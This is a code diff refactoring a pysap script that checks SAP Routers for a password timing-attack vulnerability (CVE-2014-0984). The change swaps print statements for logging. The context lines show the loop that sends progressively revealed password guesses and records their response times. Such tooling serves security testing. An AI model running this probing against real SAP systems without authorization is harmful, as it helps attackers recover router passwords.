@@ -32,9 +32,8 @@ from pysap.SAPRouter import SAPRouter, get_router_version
 # Try to import fau-timer for failing gracefully if not found
 try:
     import fau_timer
-    has_fau_timer = True
 except ImportError:
-    has_fau_timer = False
+    fau_timer = None
 
 
 # Bind the SAPRouter layer
@@ -105,8 +104,7 @@ def try_password(options, password, output=None, k=0):
     cpu_ticks = fau_timer.get_cpu_ticks()
     time = fau_timer.get_time()
 
-    if options.verbose:
-        print("Request time: CPU Speed: %s Hz CPU Ticks: %s Time: %s nanosec" % (cpu_peed, cpu_ticks, time))
+    logging.debug("Request time: CPU Speed: %s Hz CPU Ticks: %s Time: %s nanosec" % (cpu_peed, cpu_ticks, time))
 
     # Write the time to the output file
     if output:
@@ -119,31 +117,33 @@ def try_password(options, password, output=None, k=0):
 def main():
     options = parse_options()
 
-    if not has_fau_timer:
-        print ("[-] Required library not found. Please install it from https://github.com/seecurity/mona-timing-lib")
-        return
-
+    level = logging.INFO
     if options.verbose:
-        logging.basicConfig(level=logging.DEBUG)
+        level = logging.DEBUG
+    logging.basicConfig(level=level, format='%(message)s')
+
+    if fau_timer is None:
+        logging.error("[-] Required library not found. Please install it from https://github.com/seecurity/mona-timing-lib")
+        return
 
     # Initiate the connection
     conn = SAPNIStreamSocket.get_nisocket(options.remote_host, options.remote_port)
-    print("[*] Connected to the SAP Router %s:%d" % (options.remote_host, options.remote_port))
+    logging.info("[*] Connected to the SAP Router %s:%d" % (options.remote_host, options.remote_port))
 
     # Retrieve the router version used by the server if not specified
     if options.router_version is None:
         options.router_version = get_router_version(conn)
 
-    print("[*] Using SAP Router version %d" % options.router_version)
+    logging.info("[*] Using SAP Router version %d" % options.router_version)
 
-    print("[*] Checking if the server is vulnerable to a timing attack (CVE-2014-0984) ...")
+    logging.info("[*] Checking if the server is vulnerable to a timing attack (CVE-2014-0984) ...")
 
     with open(options.output, "w") as f:
 
         c = 0
         for i in range(0, len(options.password) + 1):
             password = options.password[:i] + "X" * (len(options.password) - i)
-            print("[*] Trying with password (%s) len %d" % (password, len(password)))
+            logging.info("[*] Trying with password (%s) len %d" % (password, len(password)))
             for _ in range(0, options.tries):
                 try_password(options, password, f, c)
                 c += 1
